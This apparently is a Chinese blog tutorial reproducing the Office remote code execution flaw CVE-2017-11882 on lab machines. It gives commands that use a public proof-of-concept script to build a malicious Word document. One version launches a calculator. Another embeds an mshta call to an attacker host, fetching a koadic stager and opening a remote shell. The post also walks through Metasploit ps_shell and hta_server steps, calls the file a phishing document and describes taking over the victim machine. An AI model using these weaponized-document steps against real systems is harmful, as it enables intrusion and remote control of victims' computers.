# CVE-2017-11882（Office远程代码执行） - 浅笑996 - 博客园

> 原文：[https://www.cnblogs.com/qianxiao996/p/13574652.html](https://www.cnblogs.com/qianxiao996/p/13574652.html)

测试环境：win7+kali+office 2007 xp+kali+office 2003
win7 ip:10.10.1.144 xp ip: 10.10.1.126 kali ip 10.10.1.67

### 一． 简单测试弹出计算器（xp)

#### 1.在kali下执行生成一个含有恶意代码的doc进行测试：

```
PythonCommand109b_CVE-2017-11882 -c “cmd.exe /c calc.exe” -o test.doc 
```

这条指令的意思是调用cmd并执行calc.exe（即计算器）
![在这里插入图片描述](../Images/aeb2e40de69de9c8cd457a2552491fa7.png)

#### 2.在靶机上打开就会弹出计算器：

![在这里插入图片描述](../Images/7f380150b05c0f59c906e741f54a5f09.png)

### 二． 通过koadic漏洞复现(xp)

#### 1.下载koadic并启用

[https://github.com/backlion/koadic.git](https://github.com/backlion/koadic.git)

#### 2.执行./koadice

![在这里插入图片描述](../Images/fb3c731a9c235a4709dac4fe9075a94e.png)
首先看一下koadic怎么用直接
![在这里插入图片描述](../Images/b92a1caf13c327459e8750203aa9c76c.png)

#### 3.接下来设置shell的接受地址以及端口

```
Set lhost 10.10.1.67
Set lport 55555
Run 
```

![在这里插入图片描述](../Images/11339e8b04830854f6c57558188f77b3.png)
这儿需要注意的是生成的网址需要记住，以方便后面应用
接下来通过poc生成一个含有恶意代码的doc文件

```
python Command109b_CVE-2017-11882.py -c “mshtahttp://10.10.1.67:55555/Ly348” -o exploit.doc 
```

![在这里插入图片描述](../Images/12b48f094ae113de853165b0e606b0fe.png)
接下来在目标主机打开钓鱼文档
切回koadic则发现发生变化
![在这里插入图片描述](../Images/0e5a043fdc4eef163240d1fbd4245041.png)
这个时候说明入侵成功并已经反弹shell
接下来在koadic执行zombies 0 切换到项目
![在这里插入图片描述](../Images/e76b8be05ea954f30e26ef0aac5505ca.png)
接下来用cmdshell模块
输入 cmdshell 0
![在这里插入图片描述](../Images/da64fed0f280a061d51e706df2d9acad.png)
这就已经进去cmd了接下来可以愉快的玩耍了
![在这里插入图片描述](../Images/294641ef15df33b540117637ac518085.png)
![在这里插入图片描述](../Images/80df8594c6c2f03589536f8d325506a4.png)

### 三． 通过msf的ps_shell模块 漏洞复现(win7)

#### 1.启动msfconsole

![在这里插入图片描述](../Images/988c1adedec6c0aa58cf2a26f508c2ff.png)

#### 2.查找对应的模块 search PS_shell

![在这里插入图片描述](../Images/ddd781298a5f05d59a147b5b0a4e69b6.png)
![在这里插入图片描述](../Images/2fc7b8b49bebca64dc610ac67e4ace29.png)

#### 3.利用msf生成利用的powershell脚本

![在这里插入图片描述](../Images/05ace8a528a1691f60ff7577ea3fe656.png)

![在这里插入图片描述](../Images/a294f78aeae91d9c661c50866affbef2.png)
![在这里插入图片描述](../Images/70cd00cef48878b593770534cfd94287.png)
![在这里插入图片描述](../Images/33870661897a71fa9463074b2701130a.png)
![在这里插入图片描述](../Images/4433605b3f48079ab243d8450f033990.png)
提示一点 在这儿的Command109b_CVE-2017-11882是109字节限制的 当然也有43字节的
1.接接下来在靶机打开测试文档就好
2.切换回kali 会出现
![在这里插入图片描述](../Images/d01920b1fbf081737f8df5c8e8bc9469.png)
说明已经建立链接了
接下来输入sessions -i 查看一下
![在这里插入图片描述](../Images/aa23ed08887403b66ce7d0f41bf6154b.png)
接下来切换进入
![在这里插入图片描述](../Images/3bd23cc23ab8ef1b096e9a3a1bfa10d0.png)
这个时候就已经入侵到靶机了。
![在这里插入图片描述](../Images/cbde7e9c541242cc6836d4614faadd7a.png)

### 四． 通过hta_server模块复现(xin7)

#### 1.在msf搜索hta_server模块

![在这里插入图片描述](../Images/8b14937fbed72087e28cd99617be93a6.png)

#### 2.进行设置

![在这里插入图片描述](../Images/fa9c2d1283a6ee6cb2beb47924ad1474.png)
![在这里插入图片描述](../Images/9b236315fde38aa878c2f6de9d950575.png)
![在这里插入图片描述](../Images/3d180b538c7f1a419c54ec33dd0b918e.png)

#### 3.在kali上生成带有恶意命令的doc

![在这里插入图片描述](../Images/1673e69557cae1810a10571cdd816f63.png)

#### 4.在靶机上打开test.doc文档 切换回kal

![在这里插入图片描述](../Images/2bc2b00841d8c1aeb100877efa83a65a.png)

![在这里插入图片描述](../Images/3a82f4dac1e8f2cd823607dfb548a7a0.png)
（之后的过程就和之前一样了，就不多啰嗦了）。
(ps:后两种是利用了powershell，所以在win7下测试的）